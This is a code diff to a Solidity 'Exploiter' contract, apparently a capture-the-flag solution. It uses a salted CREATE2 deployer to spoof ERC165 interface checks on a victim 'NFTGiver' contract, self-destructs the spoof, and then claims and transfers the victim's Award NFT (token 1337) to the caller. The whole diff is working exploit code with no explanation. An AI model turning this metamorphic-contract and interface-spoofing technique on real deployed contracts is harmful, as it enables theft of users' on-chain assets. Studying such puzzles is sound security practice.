@@ -180,22 +180,28 @@ contract Exploiter{
         // console.log(" --- Exploiter::()# created");
     }
 
-    function execute(address victim,bytes4 funcSig,bytes4 ifceId,address award) external payable {
+    function execute(address victim,bytes4 funcSig,bytes4 ifceId,address award,bool callSuccess ) external payable {
         // console.log("#############################################################");
         DeployInterface deployer = new DeployInterface{salt:0x0}();
         address target = deployer.deploy(ifceId);
-        _target = target;
+        // _target = target;
         // console.log("target ",target);
         // console.logBytes4(InterfaceContract(target).interfaceid());
         address(victim).call(abi.encodeWithSelector(funcSig,target));
         InterfaceContract(target).destroy{value:1000 gwei}();
         deployer.destroy();
+        if (callSuccess){
+            // console.log("Exploiter::callSuccess# ",_target);
+            NFTGiver(victim).success(ERC165(target));
+            // console.log("Exploiter::callSuccess# 1337 owner",Award(award).ownerOf(1337));
+            Award(award).transferFrom(address(this), msg.sender, 1337);
+        }
     }
 
-    function callSuccess(address victim,address award )external {
-        // console.log("Exploiter::callSuccess# ",_target);
-        NFTGiver(victim).success(ERC165(_target));
-        // console.log("Exploiter::callSuccess# 1337 owner",Award(award).ownerOf(1337));
-        Award(award).transferFrom(address(this), msg.sender, 1337);
-    }
+    // function callSuccess(address victim,address award )external {
+    //     // console.log("Exploiter::callSuccess# ",_target);
+    //     NFTGiver(victim).success(ERC165(_target));
+    //     // console.log("Exploiter::callSuccess# 1337 owner",Award(award).ownerOf(1337));
+    //     Award(award).transferFrom(address(this), msg.sender, 1337);
+    // }
 }
